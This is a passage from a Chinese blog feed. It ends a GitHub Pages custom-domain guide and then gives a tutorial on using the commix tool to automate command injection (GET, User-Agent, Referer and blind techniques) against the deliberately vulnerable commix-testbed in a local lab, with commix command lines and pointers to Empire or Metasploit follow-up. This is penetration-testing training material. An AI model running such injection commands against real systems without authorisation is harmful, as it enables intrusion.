https://faisalman.github.io/ua-parser-js/</span></div><div class="line"><span class="attr">  ua_parser:</span></div><div class="line"></div><div class="line">  <span class="comment"># Internal version: 4.6.2</span></div><div class="line">  <span class="comment"># See: http://fontawesome.io/</span></div><div class="line"><span class="attr">  fontawesome:</span></div><div class="line"></div><div class="line">  <span class="comment"># Internal version: 1</span></div><div class="line">  <span class="comment"># https://www.algolia.com</span></div><div class="line"><span class="attr">  algolia_instant_js:</span></div><div class="line"><span class="attr">  algolia_instant_css:</span></div><div class="line"></div><div class="line">  <span class="comment"># Internal version: 1.0.0</span></div><div class="line">  <span class="comment"># https://github.com/hustcc/canvas-nest.js</span></div><div class="line"><span class="attr">  canvas_nest:</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Assets</span></div><div class="line"><span class="attr">css:</span> css</div><div class="line"><span class="attr">js:</span> js</div><div class="line"><span class="attr">images:</span> images</div><div class="line"></div><div class="line"><span class="comment"># Theme version</span></div><div class="line"><span class="attr">version:</span> <span class="number">5.1</span><span class="number">.0</span></div></pre></td></tr></table></figure><h4 id="个性化设置"><a href="#个性化设置" class="headerlink" title="个性化设置"></a>个性化设置</h4><p>按照<a href="http://theme-next.iissnan.com/" target="_blank" rel="external">NexT 使用文档</a>设置一下，其中的内容下面不再赘述。</p><h4 id="绑定个人域名"><a href="#绑定个人域名" class="headerlink" title="绑定个人域名"></a>绑定个人域名</h4><p>1、在source文件夹中新建一个CNAME文件（无后缀名），然后用文本编辑器打开，在首行添加你的网站域名，如<a href="https://link.zhihu.com/?target=http%3A//xxxx.com" target="_blank" rel="external">http://xxxx.com</a>，注意前面没有<a href="http://，也没有www，然后使用hexo" target="_blank" rel="external">http://，也没有www，然后使用hexo</a> g &amp;&amp; hexo d上传部署。<br>2、在域名解析提供商，下面以dnspod为例。<br>（1）先添加一个CNAME，主机记录写@，后面记录值写上你的<a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="external">http://xxxx.github.io</a><br>（2）再添加一个CNAME，主机记录写www，后面记录值也是<a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="external">http://xxxx.github.io</a><br>这样别人用www和不用www都能访问你的网站（其实www的方式，会先解析成<a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="external">http://xxxx.github.io</a>，然后根据CNAME再变成<a href="https://link.zhihu.com/?target=http%3A//xxx.com" target="_blank" rel="external">http://xxx.com</a>，即中间是经过一次转换的）。上面，我们用的是CNAME别名记录，也有人使用A记录，后面的记录值是写github page里面的ip地址，但有时候IP地址会更改，导致最后解析不正确，所以还是推荐用CNAME别名记录要好些，不建议用IP。<br>3、等十分钟左右，刷新浏览器，用你自己域名访问下试试(<a href="https://www.zhihu.com/question/31377141/answer/87541858" target="_blank" rel="external">参考</a>)</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>commix-系统命令注入自动化测试实例</title>
      <link href="/2017/01/21/commix-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B/"/>
      <url>/2017/01/21/commix-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B/</url>
      <content type="html"><![CDATA[<h4 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h4><p>​    commix是一款很好用的命令注入的工具，前几天看了看国内对其的介绍和使用示例挺少的，所以最近有空就写了这一篇文章来列举几个使用的栗子。</p><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>​    命令注入就是部分Web应用程序提供了一些命令执行的操作，那么在Web应用程序底层去调用系统操作命令时，如果没有过滤好用户输入的数据，就很有可能形成系统命令执行漏洞来直接执行操作系统命令。详细讲解参考<a href="https://www.owasp.org/index.php/Command_Injection" target="_blank" rel="external">Command Injection</a></p><h4 id="commix简介"><a href="#commix简介" class="headerlink" title="commix简介"></a>commix简介</h4><p>​    此处就不详细介绍了如果想要了解可以看这两篇文章：</p><p>​    <a href="http://www.mottoin.com/91981.html" target="_blank" rel="external">http://www.mottoin.com/91981.html</a></p><p>​    <a href="http://www.mottoin.com/91806.html" target="_blank" rel="external">http://www.mottoin.com/91806.html</a></p><h4 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h4><p>​    在这里你可以使用DVWA或者DWAPP来实战，当然我觉得要尽可能全的包含各种类型的命令注入漏洞才算完美所以我们在此处使用commix提供的一个测试平台<a href="https://github.com/commixproject/commix-testbed" target="_blank" rel="external">commix-testbed</a>。</p><p>1.如果你在使用windows平台那么我推荐<a href="http://www.phpstudy.net/" target="_blank" rel="external">PHPStudy</a>来搭建环境</p><p>安装完成后你只需要在phpstudy的www目录下打开cmd键入：</p><p><code>git clone https://github.com/commixproject/commix-testbed.git</code></p><p>(当然你要确保你安装了Git)</p><p>之后只要启动phpstudy就可以在浏览器中访问了</p><p>2.如果你使用的是Linux或者MacOS平台我推荐用xampp来搭建环境</p><p>搭建好之后你就可以看到如下界面</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-1.png" alt="1"></p><p>环境搭建好后我们来进行渗透测试</p><h4 id="示例一：Results-based命令注入攻击"><a href="#示例一：Results-based命令注入攻击" class="headerlink" title="示例一：Results-based命令注入攻击"></a>示例一：Results-based命令注入攻击</h4><p>我们选择GET方式的Classic regular example</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-2.png" alt="2"></p><p>ping下127.0.0.1试下</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-3.png" alt="3"></p><p>复制url并打开commix开始hack</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-4.png" alt="4"></p><p>渗透主机为win后期可以借助empire（不知道empire？？？没关系<a href="http://www.mottoin.com/?s=empire" target="_blank" rel="external">戳我</a>）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-5.png" alt="5"></p><p>可以使用</p><p><code>commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/regular/GET/classic.php?addr=127.0.0.1&quot; --hostname --current-user --sys-info</code></p><p>含义：显示当前测试主机的主机名，用户名和系统信息</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-8.png" alt="8"></p><p>如果渗透主机为Linux则后期可以借助msf(不会msf？？？没关系<a href="http://www.mottoin.com/18517.html" target="_blank" rel="external">戳我</a>)</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-9.png" alt="9"></p><h4 id="示例二：User-Agent-HTTP头注入攻击"><a href="#示例二：User-Agent-HTTP头注入攻击" class="headerlink" title="示例二：User-Agent HTTP头注入攻击"></a>示例二：User-Agent HTTP头注入攻击</h4><p>选择User-Agent HTTP Header中的第一个Classic user-agent-based example</p><p><code>http://192.168.1.108/commix-testbed/scenarios/user-agent/ua(classic).php</code></p><p>然后开始使用commix注入：</p><p><code>commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/user-agent/ua(classic).php&quot; --data=&quot;addr=192.168.1.121&quot; --technique=&quot;c&quot;</code></p><p>含义：post参数addr=192.168.1.121并指定要使用的进样技术</p><p>效果如下：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-10.png" alt="10"></p><h4 id="示例三：Referer-HTTP头注入攻击"><a href="#示例三：Referer-HTTP头注入攻击" class="headerlink" title="示例三：Referer HTTP头注入攻击"></a>示例三：Referer HTTP头注入攻击</h4><p>选择Referer HTTP Header中的第一个Classic referer-based example</p><p><code>http://192.168.1.108/commix-testbed/scenarios/referer/referer(classic).php</code></p><p>然后开始使用commix注入：</p><p><code>commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/referer/referer(classic).php&quot; --data=&quot;addr=192.168.1.121&quot; --technique=&quot;c&quot;</code></p><p>和上面的差不多不解释了</p><p>效果如下：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-11.png" alt="11"></p><h4 id="示例四：Blind-命令注入攻击"><a href="#示例四：Blind-命令注入攻击" class="headerlink" title="示例四：Blind 命令注入攻击"></a>示例四：Blind 命令注入攻击</h4><p>选择Regular (GET / POST)中的Blind regular example</p><p><code>http://192.168.1.108/commix-testbed/scenarios/regular/GET/blind.php?addr=127.0.0.1</code></p><p>然后开始使用commix注入：</p><p><code>commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/regular/GET/blind.php?addr=127.0.0.1&quot; --technique=&quot;tf&quot; -v 1</code></p><p>效果如下：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-12.png" alt="12"></p><p>执行命令：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/commix-13.png" alt="13"></p><h4 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h4><p>上面的例子不是很全，有几个使用commix进行命令注入的视频，有兴趣可以下载看下</p><p>链接: <a href="https://pan.baidu.com/s/1qXMNjZm" target="_blank" rel="external">https://pan.baidu.com/s/1qXMNjZm</a> 密码: 5peb</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://github.com/commixproject/commix-testbed" target="_blank" rel="external">https://github.com/commixproject/commix-testbed</a></p><p><a href="https://github.com/commixproject/commix" target="_blank" rel="external">https://github.com/commixproject/commix</a></p><p><a href="http://www.commixproject.com/" target="_blank" rel="external">http://www.commixproject.com/</a></p>]]></content>
      
      
    </entry>
    
  
  
</search>
